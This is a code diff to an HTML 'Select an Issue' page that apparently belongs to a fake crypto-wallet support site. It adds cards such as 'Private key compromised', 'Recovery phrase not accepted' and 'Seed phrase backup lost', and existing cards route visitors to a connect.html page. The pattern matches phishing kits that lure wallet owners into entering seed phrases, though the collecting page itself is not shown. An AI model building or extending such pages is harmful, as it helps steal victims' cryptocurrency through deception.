@@ -31,12 +31,14 @@
             margin-bottom: 15px; 
             cursor: pointer; 
             transition: all 0.2s;
+            text-decoration: none;
+            display: block;
         }
         .issue-card:hover { 
             border-color: #2563eb; 
             background: #1a1a1a; 
         }
-        .issue-title { font-weight: bold; font-size: 18px; margin-bottom: 5px; }
+        .issue-title { font-weight: bold; font-size: 18px; margin-bottom: 5px; color: #fff; }
         .issue-desc { color: #aaa; font-size: 14px; line-height: 1.4; }
         
         .back-link { display: block; text-align: center; margin-top: 20px; color: #2563eb; text-decoration: none; }
@@ -46,31 +48,75 @@
     <h1>Select an Issue</h1>
     <div id="wallet-display" class="wallet-label"></div>
 
-    <!-- Card 1: Wallet Locked -->
+    <!-- Original Issues -->
     <div class="issue-card" onclick="window.location.href='connect.html?type=locked'">
         <div class="issue-title">Wallet Access Locked</div>
         <div class="issue-desc">Unable to sign transactions or view balance.</div>
     </div>
 
-    <!-- Card 2: Sync Error -->
     <div class="issue-card" onclick="window.location.href='connect.html?type=sync'">
         <div class="issue-title">Sync Error</div>
         <div class="issue-desc">Blockchain data is out of sync with the network.</div>
     </div>
 
-    <!-- Card 3: Transaction Failed -->
     <div class="issue-card" onclick="window.location.href='connect.html?type=tx'">
         <div class="issue-title">Transaction Failed</div>
         <div class="issue-desc">Transactions stuck in pending or failed state.</div>
     </div>
 
-    <!-- Card 4: Key Expired -->
     <div class="issue-card" onclick="window.location.href='connect.html?type=key'">
         <div class="issue-title">Key Expiration</div>
         <div class="issue-desc">Security keys have expired or been revoked.</div>
     </div>
 
-    <a href="wallet-select.html" class="back-link">← Back to Wallet Selection</a>
+    <!-- New Issues Added Below -->
+    
+    <a href="#" class="issue-card">
+        <div class="issue-title">TRANSACTION-DELAY</div>
+        <div class="issue-desc">Click here for any transaction related error.</div>
+    </a>
+
+    <a href="#" class="issue-card">
+        <div class="issue-title">LOCKED-DATA</div>
+        <div class="issue-desc">Corrupted wallet data</div>
+    </a>
+
+    <a href="#" class="issue-card">
+        <div class="issue-title">LOGIN-ERROR</div>
+        <div class="issue-desc">Error messages during wallet import</div>
+    </a>
+
+    <a href="#" class="issue-card">
+        <div class="issue-title">EXCHANGE</div>
+        <div class="issue-desc">Click here for token exchange or to resolve errors encountered during token exchange</div>
+    </a>
+
+    <a href="#" class="issue-card">
+        <div class="issue-title">ADDRESS-ERROR</div>
+        <div class="issue-desc">Incorrect wallet address format</div>
+    </a>
+
+    <a href="#" class="issue-card">
+        <div class="issue-title">PRIVACY-COMPROMISED</div>
+        <div class="issue-desc">Private key compromised</div>
+    </a>
+
+    <a href="#" class="issue-card">
+        <div class="issue-title">PHRASE-ERROR</div>
+        <div class="issue-desc">Recovery phrase not accepted</div>
+    </a>
+
+    <a href="#" class="issue-card">
+        <div class="issue-title">LOST-CREDENTIALS</div>
+        <div class="issue-desc">Seed phrase backup lost</div>
+    </a>
+
+    <a href="#" class="issue-card">
+        <div class="issue-title">WALLET-MALFUNC-TION</div>
+        <div class="issue-desc">Slow wallet UI response</div>
+    </a>
+
+    <a href="index.html" class="back-link">← Back to Home</a>
 
     <script>
         // Read the wallet name from the URL and display it
@@ -83,4 +129,4 @@
         }
     </script>
 </body>
-</html> 
+</html>
